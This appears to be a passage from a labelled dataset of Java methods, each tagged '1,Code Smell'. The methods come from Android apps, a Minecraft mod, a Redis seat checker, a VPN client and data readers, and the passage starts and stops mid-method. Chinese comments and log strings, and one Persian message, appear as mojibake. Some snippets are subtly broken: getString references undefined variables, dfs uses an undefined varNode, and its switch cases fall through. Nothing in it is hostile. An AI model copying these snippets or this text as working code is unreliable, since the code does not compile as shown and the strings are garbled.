      String[] orders=new String[]{""FHD"",""HD"",""SD""};
      for (      String or : orders) {
        for (int i=0; i < playList.length(); i++) {
          JSONObject obj=playList.getJSONObject(i);
          if (obj.optString(""template_id"").equals(or)) {
            videoUrl=obj.getString(""url"");
            break;
          }
        }
        if (!videoUrl.isEmpty())         break;
      }
      if (videoUrl.isEmpty() && playList.length() > 0) {
        videoUrl=playList.getJSONObject(0).getString(""url"");
      }
      JSONObject headerObj=new JSONObject();
      headerObj.put(""user-agent"","" Dalvik/2.1.0 (Linux; U; Android 7.0; ZTE BA520 Build/MRA58K)"");
      headerObj.put(""referer"","" https://www.aliyundrive.com/"");
      JSONObject result=new JSONObject();
      result.put(""parse"",0);
      result.put(""playUrl"","""");
      result.put(""url"",videoUrl);
      result.put(""header"",headerObj.toString());
      return result.toString();
    }
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",1,Code Smell
"public boolean isReflectField(int access,String className,String name){
  if (unknownClassNameReflectFieldNames.contains(name)) {
    return true;
  }
  if (getDeclaredFieldReflectFields.contains(getKey(className,name,DESC_ALL))) {
    return true;
  }
  if (getDeclaredFieldsReflectClassNames.contains(className)) {
    return true;
  }
  if (TypeUtil.isPublic(access)) {
    Set<String> classNames=new HashSet<>();
    for (    ReflectFieldModel reflectFieldModel : getFieldReflectModels) {
      if (name.equals(reflectFieldModel.memberName)) {
        classNames.clear();
        getAllSuperAndChildClass(reflectFieldModel.owner,classNames,true);
        if (classNames.contains(className)) {
          return true;
        }
      }
    }
    if (getFieldsReflectClassNames.contains(className)) {
      return true;
    }
    for (    String reflectClassName : getFieldsReflectClassNames) {
      classNames.clear();
      getAllSuperAndChildClass(reflectClassName,classNames,true);
      if (classNames.contains(className)) {
        return true;
      }
    }
  }
  return false;
}
",1,Code Smell
"public static HeadTail process(Node L,Node R,int N){
  if (L == null) {
    return null;
  }
  if (L == R) {
    return new HeadTail(L,R);
  }
  int randomIndex=(int)(Math.random() * N);
  Node randomNode=L;
  while (randomIndex-- != 0) {
    randomNode=randomNode.next;
  }
  if (randomNode == L || randomNode == R) {
    if (randomNode == L) {
      L=randomNode.next;
      L.last=null;
    }
 else {
      randomNode.last.next=null;
    }
  }
 else {
    randomNode.last.next=randomNode.next;
    randomNode.next.last=randomNode.last;
  }
  randomNode.last=null;
  randomNode.next=null;
  Info info=partition(L,randomNode);
  HeadTail lht=process(info.lh,info.lt,info.ls);
  HeadTail rht=process(info.rh,info.rt,info.rs);
  if (lht != null) {
    lht.t.next=info.eh;
    info.eh.last=lht.t;
  }
  if (rht != null) {
    info.et.next=rht.h;
    rht.h.last=info.et;
  }
  Node h=lht != null ? lht.h : info.eh;
  Node t=rht != null ? rht.t : info.et;
  return new HeadTail(h,t);
}",1,Code Smell
"private HashMap<String,byte[]> processCompleteMessage(ByteBuffer buffer) throws Exception {
  int len=buffer.getInt();
  int x=buffer.get();
  if (len > MAX_LEN) {
    throw new IOException(""invalid len"");
  }
  byte[] bs=new byte[len];
  buffer.get(bs);
  for (int i=0; i < bs.length; i++) {
    bs[i]=(byte)(bs[i] ^ x);
  }
  HashMap<String,byte[]> m=new HashMap<>();
  int i=0;
  while (i < bs.length - 1) {
    short kLen=bs[i];
    i+=1;
    if (i + kLen >= bs.length) {
      throw new Exception(""key len error"");
    }
    if (kLen < 0) {
      throw new Exception(""key len error"");
    }
    byte[] keyBytes=copyOfRange(bs,i,i + kLen);
    String key=new String(keyBytes);
    i+=kLen;
    if (i + 4 >= bs.length) {
      throw new Exception(""value len error"");
    }
    byte[] vLenBytes=copyOfRange(bs,i,i + 4);
    int vLen=bytesToU32(vLenBytes);
    i+=4;
    if (vLen < 0 || i + vLen > bs.length) {
      throw new Exception(""value error"");
    }
    byte[] value=copyOfRange(bs,i,i + vLen);
    i+=vLen;
    m.put(key,value);
  }
  return m;
}",1,Code Smell
"private void processServerBalance(TMaster tMaster,long balanceId,StringBuilder sBuffer){
  int curDoingTasks=this.curSvrBalanceParal.get();
  if (curDoingTasks > 0) {
    logger.info(sBuffer.append(""[Svr-Balance Status] "").append(balanceId).append("" the Server-Balance has "").append(curDoingTasks).append("" task(s) in progress!"").toString());
    sBuffer.delete(0,sBuffer.length());
    return;
  }
  final boolean isStartBalance=startupBalance;
  List<String> groupsNeedToBalance=isStartBalance ? consumerHolder.getAllServerBalanceGroups() : getNeedToBalanceGroups(sBuffer);
  sBuffer.delete(0,sBuffer.length());
  int balanceTaskCnt=groupsNeedToBalance.size();
  if (balanceTaskCnt > 0) {
    int unitNum=(balanceTaskCnt + masterConfig.getRebalanceParallel() - 1) / masterConfig.getRebalanceParallel();
    int startIndex=0;
    int endIndex=0;
    final long startBalanceTime=System.currentTimeMillis();
    curSvrBalanceParal.set(masterConfig.getRebalanceParallel());
    for (int i=0; i < masterConfig.getRebalanceParallel(); i++) {
      startIndex=Math.min((i) * unitNum,balanceTaskCnt);
      endIndex=Math.min((i + 1) * unitNum,balanceTaskCnt);
      final List<String> subGroups=groupsNeedToBalance.subList(startIndex,endIndex);
      if (subGroups.isEmpty()) {
        if (curSvrBalanceParal.decrementAndGet() == 0) {
          MasterSrvStatsHolder.updSvrBalanceDurations(System.currentTimeMillis() - startBalanceTime);
        }
        continue;
      }
      this.svrExecutor.execute(new Runnable(){
        @Override public void run(){
          try {
            if (subGroups.isEmpty()) {
              return;
            }
            final StringBuilder strBuffer=new StringBuilder(512);
            try {
              tMaster.processResetbalance(balanceId,isStartBalance,subGroups,strBuffer);
            }
 catch (            Throwable e) {
              logger.warn(new StringBuilder(1024).append(""[Svr-Balance Status] Error during reset-reb,"").append(""the groups that may be affected are "").append(subGroups).append("",error is "").append(e).toString());
            }
            if (tMaster.isStopped()) {
              return;
            }
            try {
              tMaster.processRebalance(balanceId,isStartBalance,subGroups,strBuffer);
            }
 catch (            Throwable e) {
              logger.warn(new StringBuilder(1024).append(""[Svr-Balance Status] Error during normal-reb,"").append(""the groups that may be affected are "").append(subGroups).append("",error is "").append(e).toString());
            }
          }
 catch (          Throwable e) {
            logger.warn(""[Svr-Balance Status] Error during process"",e);
          }
 finally {
            if (curSvrBalanceParal.decrementAndGet() == 0) {
              MasterSrvStatsHolder.updSvrBalanceDurations(System.currentTimeMillis() - startBalanceTime);
            }
          }
        }
      }
);
    }
  }
  startupBalance=false;
}",1,Code Smell
"@Deprecated public static void init(Application application){
  if (sGlobalConfig != null) {
    init(application,sGlobalConfig);
  }
 else {
    init(application,new CodeLocatorConfig.Builder().build());
  }
}
@Deprecated public static void init(Application application,CodeLocatorConfig config){
  if (application == null) {
    throw new IllegalArgumentException(""Application can not be null!"");
  }
  if (config == null) {
    config=new CodeLocatorConfig.Builder().build();
  }
  sGlobalConfig=config;
  loadConfigListFromSp(application,sGlobalConfig);
  loadEnableFromSp(application,sGlobalConfig);
  if (sApplication != null) {
    if (sGlobalConfig.isDebug()) {
      Log.d(CodeLocator.TAG,""CodeLocator宸茬粡鍒濆鍖�, 鏃犻渶鍐嶅垵濮嬪寲"");
    }
    if (!sGlobalConfig.isEnable()) {
      Log.e(CodeLocator.TAG,""CodeLocator琚鐢�, 鏃犳硶浣跨敤鍏ㄩ儴鍔熻兘"");
      unRegisterReceiver();
    }
 else {
      if (disableLancet()) {
        Log.e(CodeLocator.TAG,""CodeLocator宸插惎鐢�, 浣嗘棤娉曚娇鐢ㄨ烦杞姛鑳�"");
      }
    }
    saveEnableForSp(application,sGlobalConfig);
    return;
  }
  sApplication=application;
  try {
    sCodeLocatorDir=new File(application.getExternalCacheDir(),CodeLocatorConstants.BASE_DIR_NAME);
    if (!sCodeLocatorDir.exists()) {
      sCodeLocatorDir.mkdirs();
    }
  }
 catch (  Throwable ignore) {
  }
  if (!sGlobalConfig.isLazyInit()) {
    registerLifecycleCallbacks();
    if (sGlobalConfig.isDebug()) {
      Log.d(CodeLocator.TAG,""CodeLocator鍒濆鍖栨垚鍔�"");
    }
  }
 else {
    sHandler.post(new Runnable(){
      @Override public void run(){
        mActiveActivityCount=getCurrentActivityCount();
        registerLifecycleCallbacks();
        if (mActiveActivityCount > 0) {
          checkAppForegroundChange();
        }
        if (sGlobalConfig.isDebug()) {
          Log.d(CodeLocator.TAG,""CodeLocator寤惰繜鍒濆鍖栨垚鍔�, 鍒濆Activity鏁� "" + mActiveActivityCount);
        }
      }
    }
);
  }
  if (sGlobalConfig.canFetchConfig()) {
    sHandler.postDelayed(() -> {
      try {
        final Class<?> aClass=Class.forName(""okhttp3.OkHttpClient"");
        CodeLocatorConfigFetcher.fetchCodeLocatorConfig(sApplication);
      }
 catch (      Throwable ignore) {
        Log.d(CodeLocator.TAG,""Error "" + ignore);
      }
    }
,3000L);
  }
}",1,Code Smell
"public static void hide(@NonNull FrameLayout containerLayout){
  hide(containerLayout,true);
}
public static void hide(@NonNull FrameLayout containerLayout,boolean animated){
  final Bulletin bulletin=find(containerLayout);
  if (bulletin != null) {
    bulletin.hide(animated && isTransitionsEnabled(),0);
  }
}
public void hide(){
  hide(isTransitionsEnabled(),0);
}
public void hide(long duration){
  hide(isTransitionsEnabled(),duration);
}
public void hide(boolean animated,long duration){
  if (layout == null) {
    return;
  }
  if (showing) {
    showing=false;
    if (visibleBulletin == this) {
      visibleBulletin=null;
    }
    int bottomOffset=currentBottomOffset;
    currentBottomOffset=0;
    if (ViewCompat.isLaidOut(layout)) {
      layout.removeCallbacks(hideRunnable);
      if (animated) {
        layout.transitionRunningExit=true;
        layout.delegate=currentDelegate;
        layout.invalidate();
        if (duration >= 0) {
          Layout.DefaultTransition transition=new Layout.DefaultTransition();
          transition.duration=duration;
          layoutTransition=transition;
        }
 else {
          ensureLayoutTransitionCreated();
        }
        layoutTransition.animateExit(layout,layout::onExitTransitionStart,() -> {
          if (currentDelegate != null && !layout.top) {
            currentDelegate.onBottomOffsetChange(0);
            currentDelegate.onHide(this);
          }
          layout.transitionRunningExit=false;
          layout.onExitTransitionEnd();
          layout.onHide();
          containerLayout.removeView(parentLayout);
          containerLayout.removeOnLayoutChangeListener(containerLayoutListener);
          layout.onDetach();
        }
,offset -> {
          if (currentDelegate != null && !layout.top) {
            currentDelegate.onBottomOffsetChange(layout.getHeight() - offset);
          }
        }
,bottomOffset);
        return;
      }
    }
    if (currentDelegate != null && !layout.top) {
      currentDelegate.onBottomOffsetChange(0);
      currentDelegate.onHide(this);
    }
    layout.onExitTransitionStart();
    layout.onExitTransitionEnd();
    layout.onHide();
    if (containerLayout != null) {
      AndroidUtilities.runOnUIThread(() -> {
        containerLayout.removeView(parentLayout);
        containerLayout.removeOnLayoutChangeListener(containerLayoutListener);
      }
);
    }
    layout.onDetach();
  }
}",1,Code Smell
"private void updateAndScorePlayerVolume(World w,boolean updateReward){
  int wrongBlocks=0;
  int rightBlocks=0;
  int totalMatchingBlocks=0;
  BlockDrawingHelper drawContext=new BlockDrawingHelper();
  drawContext.beginDrawing(w);
  for (int x=this.sourceBounds.getMin().getX(); x <= this.sourceBounds.getMax().getX(); x++) {
    for (int y=this.sourceBounds.getMin().getY(); y <= this.sourceBounds.getMax().getY(); y++) {
      for (int z=this.sourceBounds.getMin().getZ(); z <= this.sourceBounds.getMax().getZ(); z++) {
        BlockPos goalStructurePos=new BlockPos(x,y,z);
        BlockPos playerStructurePos=goalStructurePos.add(this.delta);
        IBlockState srcState=getSourceBlockState(w,goalStructurePos);
        IBlockState dstState=getDestBlockState(w,playerStructurePos);
        if (srcState == null || dstState == null)         continue;
        boolean destAir=w.isAirBlock(playerStructurePos);
        if (srcState.equals(dstState)) {
          if (!destAir)           rightBlocks++;
          if (blockTypeOnCorrectPlacement != null && !w.isAirBlock(goalStructurePos)) {
            drawContext.setBlockState(w,playerStructurePos,blockTypeOnCorrectPlacement);
            drawContext.setBlockState(w,goalStructurePos,blockTypeOnCorrectPlacement);
          }
          totalMatchingBlocks++;
        }
 else {
          if (!destAir) {
            wrongBlocks++;
            if (blockTypeOnIncorrectPlacement != null) {
              drawContext.setBlockState(w,playerStructurePos,blockTypeOnIncorrectPlacement);
            }
          }
          IBlockState actualState=w.getBlockState(goalStructurePos);
          if (!actualState.equals(srcState))           drawContext.setBlockState(w,goalStructurePos,new XMLBlockState(srcState));
        }
      }
    }
  }
  drawContext.endDrawing(w);
  int score=rightBlocks - wrongBlocks;
  boolean sendData=false;
  boolean sendCompletionBonus=false;
  int reward=0;
  if (updateReward && score != this.currentScore) {
    reward=score - this.currentScore;
    sendData=true;
  }
  this.currentScore=score;
  if (totalMatchingBlocks == this.structureVolume) {
    if (!this.structureHasBeenCompleted) {
      if (updateReward)       sendCompletionBonus=true;
    }
    this.structureHasBeenCompleted=true;
  }
  this.valid=true;
  if (sendData) {
    HashMap<String,String> data=new HashMap<String,String>();
    data.put(""reward"",Integer.toString(reward));
    data.put(""completed"",Boolean.toString(sendCompletionBonus));
    MalmoMod.safeSendToAll(MalmoMessageType.SERVER_BUILDBATTLEREWARD,data);
  }
}",1,Code Smell
"/** 
 * 楂橀搧鍟嗗姟搴ф槸鍚﹀瓨鍦ㄦ鏌ユ柟娉�
 * @param key              缂撳瓨Key
 * @param convert          搴т綅缁熻Map
 * @param distributedCache 鍒嗗竷寮忕紦瀛樻帴鍙�
 * @return 鍒ゆ柇搴т綅鏄惁瀛樺湪 true or false
 */
@Override public boolean checkSeat(final String key,HashMap<Integer,Integer> convert,DistributedCache distributedCache){
  boolean flag=false;
  ValueOperations<String,String> opsForValue=((StringRedisTemplate)distributedCache.getInstance()).opsForValue();
  AtomicInteger matchCount=new AtomicInteger(0);
  for (int i=0; i < 3; i++) {
    int cnt=0;
    if (convert.containsKey(i)) {
      for (int j=0; j < 2; j++) {
        Boolean bit=opsForValue.getBit(key,i + j * 3);
        if (null != bit && bit) {
          cnt=cnt + 1;
        }
        if (cnt == convert.get(i)) {
          matchCount.getAndIncrement();
          break;
        }
      }
      if (cnt != convert.get(i)) {
        break;
      }
    }
    if (matchCount.get() == convert.size()) {
      flag=true;
      break;
    }
  }
  return flag;
}",1,Code Smell
"private void onTickPlay(){
  Collection<Note> notes=song.getNotesMap().get(this.currentTick);
  if (!notes.isEmpty()) {
    if (autoRotate.get()) {
      Optional<Note> firstNote=notes.stream().findFirst();
      if (firstNote.isPresent()) {
        BlockPos firstPos=noteBlockPositions.get(firstNote.get());
        if (firstPos != null) {
          Rotations.rotate(Rotations.getYaw(firstPos),Rotations.getPitch(firstPos));
        }
      }
    }
    if (swingArm.get()) {
      mc.player.swingHand(Hand.MAIN_HAND);
    }
    for (    Note note : notes) {
      BlockPos pos=noteBlockPositions.get(note);
      if (pos == null) {
        return;
      }
      if (polyphonic.get()) {
        playRotate(pos);
      }
 else {
        this.playRotate(pos);
      }
    }
  }
}
",1,Code Smell
"public ExcelFileData excelUpload(@RequestParam(""file"") MultipartFile file,@RequestParam(""id"") long datasourceId,@RequestParam(""editType"") Integer editType) throws DEException {
  ExcelUtils excelUtils=new ExcelUtils();
  ExcelFileData excelFileData=excelUtils.excelSaveAndParse(file);
  if (editType == 1 || editType == 0) {
    CoreDatasource coreDatasource=datasourceMapper.selectById(datasourceId);
    if (coreDatasource != null) {
      DatasourceRequest datasourceRequest=new DatasourceRequest();
      datasourceRequest.setDatasource(coreDatasource);
      List<DatasetTableDTO> datasetTableDTOS=ExcelUtils.getTables(datasourceRequest);
      List<ExcelSheetData> excelSheetDataList=new ArrayList<>();
      for (      ExcelSheetData sheet : excelFileData.getSheets()) {
        for (        DatasetTableDTO datasetTableDTO : datasetTableDTOS) {
          if (excelDataTableName(datasetTableDTO.getTableName()).equals(sheet.getTableName()) || isCsv(file.getOriginalFilename())) {
            List<String> fieldNames=sheet.getFields().stream().map(TableField::getName).collect(Collectors.toList());
            List<String> fieldTypes=sheet.getFields().stream().map(TableField::getFieldType).collect(Collectors.toList());
            Collections.sort(fieldNames);
            Collections.sort(fieldTypes);
            datasourceRequest.setTable(datasetTableDTO.getTableName());
            List<String> oldFieldNames=ExcelUtils.getTableFields(datasourceRequest).stream().map(TableField::getName).collect(Collectors.toList());
            List<String> oldFieldTypes=ExcelUtils.getTableFields(datasourceRequest).stream().map(TableField::getFieldType).collect(Collectors.toList());
            Collections.sort(oldFieldNames);
            Collections.sort(oldFieldTypes);
            if (fieldNames.equals(oldFieldNames) && fieldTypes.equals(oldFieldTypes)) {
              sheet.setDeTableName(datasetTableDTO.getTableName());
              excelSheetDataList.add(sheet);
            }
          }
        }
      }
      if (CollectionUtils.isEmpty(excelSheetDataList) || excelSheetDataList.size() != datasetTableDTOS.size()) {
        DEException.throwException(""涓婁紶鏂囦欢涓庢簮鏂囦欢涓嶄竴鑷达紝璇锋鏌ユ枃浠�!"");
      }
      excelFileData.setSheets(excelSheetDataList);
    }
  }
  for (  ExcelSheetData sheet : excelFileData.getSheets()) {
    for (int i=0; i < sheet.getFields().size() - 1; i++) {
      for (int j=i + 1; j < sheet.getFields().size(); j++) {
        if (sheet.getFields().get(i).getName().equalsIgnoreCase(sheet.getFields().get(j).getName())) {
          DEException.throwException(sheet.getExcelLabel() + Translator.get(""i18n_field_name_repeat"") + sheet.getFields().get(i).getName());
        }
      }
    }
  }
  return excelFileData;
}",1,Code Smell
"/** 
 * Note this method has assumption that item is filled either in the same row next row of last item.  Search until row index wrapped.
 */
@Override public int findRowMin(boolean findLarge,int indexLimit,int[] indices){
  int value;
  int edge=mProvider.getEdge(indexLimit);
  Location loc=getLocation(indexLimit);
  int row=loc.row;
  int index=indexLimit;
  int visitedRows=1;
  int visitRow=row;
  if (mReversedFlow) {
    value=edge - mProvider.getSize(indexLimit);
    for (int i=indexLimit - 1; visitedRows < mNumRows && i >= mFirstVisibleIndex; i--) {
      edge-=loc.offset;
      loc=getLocation(i);
      if (loc.row != visitRow) {
        visitRow=loc.row;
        visitedRows++;
        int newValue=edge - mProvider.getSize(i);
        if (findLarge ? newValue > value : newValue < value) {
          value=newValue;
          row=visitRow;
          index=i;
        }
      }
    }
  }
 else {
    value=edge;
    for (int i=indexLimit + 1; visitedRows < mNumRows && i <= mLastVisibleIndex; i++) {
      loc=getLocation(i);
      edge+=loc.offset;
      if (loc.row != visitRow) {
        visitRow=loc.row;
        visitedRows++;
        if (findLarge ? edge > value : edge < value) {
          value=edge;
          row=visitRow;
          index=i;
        }
      }
    }
  }
  if (indices != null) {
    indices[0]=row;
    indices[1]=index;
  }
  return value;
}",1,Code Smell
"@Override public String getString(ResultSet rs,int index,boolean limitSize) throws SQLException {
  Object obj=rs.getObject(index);
  if (obj == null) {
    return null;
  }
  try {
    if (obj instanceof BigDecimal) {
      return bigDecimal.toPlainString();
    }
 else     if (obj instanceof Double) {
      return BigDecimal.valueOf(d).toPlainString();
    }
 else     if (obj instanceof Float) {
      return BigDecimal.valueOf(f).toPlainString();
    }
 else     if (obj instanceof Clob) {
      return largeString(rs,index,limitSize);
    }
 else     if (obj instanceof byte[]) {
      return largeString(rs,index,limitSize);
    }
 else     if (obj instanceof Blob) {
      return largeStringBlob(blob,limitSize);
    }
 else     if (obj instanceof Timestamp || obj instanceof LocalDateTime) {
      return largeTime(obj);
    }
 else {
      return obj.toString();
    }
  }
 catch (  Exception e) {
    log.warn(""Failed to parse number:{},{}"",index,obj,e);
    return obj.toString();
  }
}
",1,Code Smell
"private void read() throws IOException {
  int pos=0;
  ArrayList<HashMap<Integer,Double>> processedData=new ArrayList<>();
  ArrayList<String> labels=new ArrayList<>();
  String line;
  try (BufferedReader r=new BufferedReader(new InputStreamReader(url.openStream(),StandardCharsets.UTF_8))){
    for (; ; ) {
      line=r.readLine();
      if (line == null) {
        break;
      }
      pos++;
      String[] fields=splitPattern.split(line);
      try {
        boolean valid=true;
        HashMap<Integer,Double> features=new HashMap<>();
        for (int i=1; i < fields.length && valid; i++) {
          int ind=fields[i].indexOf(':');
          if (ind < 0) {
            logger.warning(String.format(""Weird line at %d"",pos));
            valid=false;
          }
          String ids=fields[i].substring(0,ind);
          int id=Integer.parseInt(ids);
          if ((!rangeSet) && (maxFeatureID < id)) {
            maxFeatureID=id;
          }
          if ((!rangeSet) && (minFeatureID > id)) {
            minFeatureID=id;
          }
          double val=Double.parseDouble(fields[i].substring(ind + 1));
          Double value=features.put(id,val);
          if (value != null) {
            logger.warning(String.format(""Repeated features at line %d"",pos));
            valid=false;
          }
        }
        if (valid) {
          labels.add(fields[0]);
          processedData.add(features);
        }
 else {
          throw new IOException(""Invalid LibSVM format file"");
        }
      }
 catch (      NumberFormatException ex) {
        logger.warning(String.format(""Weird line at %d"",pos));
        throw new IOException(""Invalid LibSVM format file"",ex);
      }
    }
  }
   int width=("""" + maxFeatureID).length();
  String formatString=""%0"" + width + ""d"";
  int maxID=maxFeatureID;
  if (minFeatureID != 0) {
    minFeatureID=1;
    zeroIndexed=false;
  }
 else {
    maxID++;
    zeroIndexed=true;
  }
  String[] featureNames=new String[maxID];
  for (int i=0; i < maxID; i++) {
    featureNames[i]=String.format(formatString,i);
  }
  ArrayList<Feature> buffer=new ArrayList<>();
  for (int i=0; i < processedData.size(); i++) {
    String labelStr=labels.get(i);
    HashMap<Integer,Double> features=processedData.get(i);
    try {
      T curLabel=outputFactory.generateOutput(labelStr);
      ArrayExample<T> example=new ArrayExample<>(curLabel);
      buffer.clear();
      for (      Map.Entry<Integer,Double> e : features.entrySet()) {
        int id=e.getKey() - minFeatureID;
        if (id < maxID) {
          double value=e.getValue();
          Feature f=new Feature(featureNames[id],value);
          buffer.add(f);
        }
      }
      example.addAll(buffer);
      data.add(example);
    }
 catch (    NumberFormatException e) {
      logger.warning(String.format(""Failed to parse example %d"",i));
      throw new IOException(""Invalid LibSVM format file"");
    }
  }
}",1,Code Smell
"private void dfs(Node startNode){
  Deque<Node> stack=new ArrayDeque<>();
  stack.push(startNode);
  while (!stack.isEmpty()) {
    Node node=stack.pop();
    if (visitedNodes.contains(node)) {
      continue;
    }
    logger.trace(""dfs on {}"",node);
    visitedNodes.add(node);
    if (node instanceof VarNode) {
      Var var=varNode.getVar();
      Set<Obj> varPts=pta.getBase().getPointsToSet(var);
      getReturnToVariablesOf(var).forEach(toVar -> {
        VarNode toNode=ofg.getVarNode(toVar);
        if (toNode != null && outNodes.contains(toNode)) {
          for (          VarNode inNode : inNodes) {
            Var inVar=inNode.getVar();
            if (!Collections.disjoint(pta.getBase().getPointsToSet(inVar),varPts)) {
              wuEdges.put(node,new UnwrappedFlowEdge(node,toNode));
              break;
            }
          }
        }
      }
);
    }
    List<FlowEdge> nextEdges=new ArrayList<>();
    for (    FlowEdge edge : getOutEdgesOf(node)) {
switch (edge.kind()) {
case LOCAL_ASSIGN:
{
          nextEdges.add(edge);
        }
case INSTANCE_LOAD:
{
        VarNode toNode=(VarNode)edge.target();
        Var toVar=toNode.getVar();
        if (pce.pceMethodsOf(type).contains(toVar.getMethod())) {
          nextEdges.add(edge);
        }
      }
case INSTANCE_STORE:
{
      InstanceNode toNode=(InstanceNode)edge.target();
      Obj base=toNode.getBase();
      if (base.getType().equals(type)) {
        invokeMethods.stream().map(m -> m.getIR().getThis()).map(ofg::getVarNode).filter(Objects::nonNull).forEach(nextNode -> wuEdges.put(toNode,new WrappedFlowEdge(toNode,nextNode)));
        nextEdges.add(edge);
      }
 else       if (oag.getAllocateesOf(type).contains(base)) {
        VarNode assignedNode=getAssignedNode(base);
        if (assignedNode != null) {
          wuEdges.put(toNode,new WrappedFlowEdge(toNode,assignedNode));
        }
        nextEdges.add(edge);
      }
    }
case OTHER:
{
    if (edge instanceof WrappedFlowEdge) {
      VarNode toNode=(VarNode)edge.target();
      Var toVar=toNode.getVar();
      if (pce.pceMethodsOf(type).contains(toVar.getMethod())) {
        nextEdges.add(edge);
      }
    }
 else     if (edge instanceof UnwrappedFlowEdge) {
      nextEdges.add(edge);
    }
  }
}
}
for (FlowEdge nextEdge : nextEdges) {
stack.push(nextEdge.target());
}
}
}
",1,Code Smell
"public static int getProcessType(){
  if (mProcType != 0) {
    return mProcType;
  }
  String[] parts=getProcessName().split("":"");
  if (parts.length == 1) {
    if (""unknown"".equals(parts[0])) {
      return PROC_MAIN;
    }
 else     if (""com.tencent.ilink.ServiceProcess"".equals(parts[0])) {
      mProcType=PROC_OTHERS;
    }
 else {
      mProcType=PROC_MAIN;
    }
  }
 else {
    String tail=parts[parts.length - 1];
    if (""MSF"".equals(tail)) {
      mProcType=PROC_MSF;
    }
 else     if (""peak"".equals(tail)) {
      mProcType=PROC_PEAK;
    }
 else     if (""tool"".equals(tail)) {
      mProcType=PROC_TOOL;
    }
 else     if (tail.startsWith(""qzone"")) {
      mProcType=PROC_QZONE;
    }
 else     if (""video"".equals(tail)) {
      mProcType=PROC_VIDEO;
    }
 else     if (tail.startsWith(""mini"")) {
      mProcType=PROC_MINI;
    }
 else     if (tail.startsWith(""plugin"")) {
      mProcType=PROC_PLUGIN_PROCESS;
    }
 else     if (tail.startsWith(""troop"")) {
      mProcType=PROC_TROOP;
    }
 else     if (tail.startsWith(""unity"")) {
      mProcType=PROC_UNITY;
    }
 else     if (tail.startsWith(""wxa_container"")) {
      mProcType=PROC_WXA_CONTAINER;
    }
 else     if (tail.startsWith(""qqfav"")) {
      mProcType=PROC_QQFAV;
    }
 else {
      mProcType=PROC_OTHERS;
    }
  }
  return mProcType;
}",1,Code Smell
"@Override protected void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  cleanOrMigrateSettings();
  pIPUtils=PublicIPUtils.getInstance(getApplicationContext());
  setContentView(R.layout.activity_main);
  ImageView infoIcon=findViewById(R.id.info_icon);
  ImageView bugIcon=findViewById(R.id.bug_icon);
  ImageView settingsIcon=findViewById(R.id.setting_icon);
  FrameLayout switchButtonFrame=findViewById(R.id.switch_button_frame);
  switchButton=findViewById(R.id.switch_button);
  stateText=findViewById(R.id.state_text);
  publicIP=findViewById(R.id.publicIP);
  ipProgressBar=findViewById(R.id.ipProgressBar);
  infoIcon.setOnClickListener(v -> startActivity(new Intent(MainActivity.this,InfoActivity.class)));
  bugIcon.setOnClickListener(v -> startActivity(new Intent(MainActivity.this,BugActivity.class)));
  settingsIcon.setOnClickListener(v -> startActivity(new Intent(MainActivity.this,SettingsActivity.class)));
  switchButtonFrame.setOnClickListener(v -> switchButton.toggle());
  ActivityResultLauncher<Intent> vpnPermissionLauncher=registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),result -> {
    if (result.getResultCode() != RESULT_OK) {
      Toast.makeText(this,""Really!?"",Toast.LENGTH_LONG).show();
    }
    switchButton.setChecked(false);
  }
);
  switchButton.setOnCheckedChangeListener((view,isChecked) -> {
    if (!isChecked) {
      if (!lastKnownConnectionState.isDisconnected()) {
        OblivionVpnService.stopVpnService(this);
      }
      return;
    }
    Intent vpnIntent=OblivionVpnService.prepare(this);
    if (vpnIntent != null) {
      vpnPermissionLauncher.launch(vpnIntent);
      return;
    }
    if (lastKnownConnectionState.isDisconnected()) {
      OblivionVpnService.startVpnService(this);
    }
  }
);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
    ActivityResultLauncher<String> pushNotificationPermissionLauncher=registerForActivityResult(new ActivityResultContracts.RequestPermission(),isGranted -> {
      if (!isGranted) {
        Toast.makeText(this,""Permission denied"",Toast.LENGTH_LONG).show();
      }
    }
);
    pushNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS);
  }
  getOnBackPressedDispatcher().addCallback(this,new OnBackPressedCallback(true){
    @Override public void handleOnBackPressed(){
      if (backPressedTime + 2000 > System.currentTimeMillis()) {
        if (backToast != null)         backToast.cancel();
        finish();
      }
 else {
        if (backToast != null)         backToast.cancel();
        backToast=Toast.makeText(MainActivity.this,""亘乇丕蹖 禺乇賵噩貙 丿賵亘丕乇賴 亘丕夭诏卮鬲 乇丕 賮卮丕乇 丿賴蹖丿."",Toast.LENGTH_SHORT);
        backToast.show();
      }
      backPressedTime=System.currentTimeMillis();
    }
  }
);
}",1,Code Smell
"public boolean openPhotoForSelect(final ArrayList<Object> photos,final int index,int type,boolean documentsPicker,final PhotoViewerProvider provider,ChatActivity chatActivity){
  return openPhotoForSelect(null,null,photos,index,type,documentsPicker,provider,chatActivity);
}
public boolean openPhotoForSelect(final TLRPC.FileLocation fileLocation,final ImageLocation imageLocation,final ArrayList<Object> photos,final int index,int type,boolean documentsPicker,final PhotoViewerProvider provider,ChatActivity chatActivity){
  isDocumentsPicker=documentsPicker;
  if (pickerViewSendButton != null) {
    FrameLayout.LayoutParams layoutParams2=(FrameLayout.LayoutParams)pickerViewSendButton.getLayoutParams();
    if (type == 4 || type == 5) {
      pickerViewSendButton.setImageResource(R.drawable.msg_input_send_mini);
      layoutParams2.bottomMargin=dp(7.33f);
    }
 else     if (type == SELECT_TYPE_AVATAR || type == SELECT_TYPE_WALLPAPER || type == SELECT_TYPE_QR || type == SELECT_TYPE_STICKER) {
      pickerViewSendButton.setImageResource(R.drawable.floating_check);
      pickerViewSendButton.setPadding(0,dp(1),0,0);
      layoutParams2.bottomMargin=dp(7.33f);
    }
 else {
      pickerViewSendButton.setImageResource(R.drawable.msg_input_send_mini);
      layoutParams2.bottomMargin=dp(2.33f);
    }
    pickerViewSendButton.setLayoutParams(layoutParams2);
  }
  if (type != SELECT_TYPE_STICKER && stickerMakerView != null) {
    stickerEmpty=false;
    if (tuneItem != null) {
      tuneItem.setAlpha(1f);
    }
    if (outlineBtn != null)     outlineBtn.setActive(false,false);
    stickerMakerView.clean();
    if (selectedEmojis != null)     selectedEmojis.clear();
  }
  if (sendPhotoType != SELECT_TYPE_AVATAR && type == SELECT_TYPE_AVATAR && isVisible) {
    sendPhotoType=type;
    doneButtonPressed=false;
    actionBarContainer.setTitle("""");
    actionBarContainer.setSubtitle("""",false);
    placeProvider=provider;
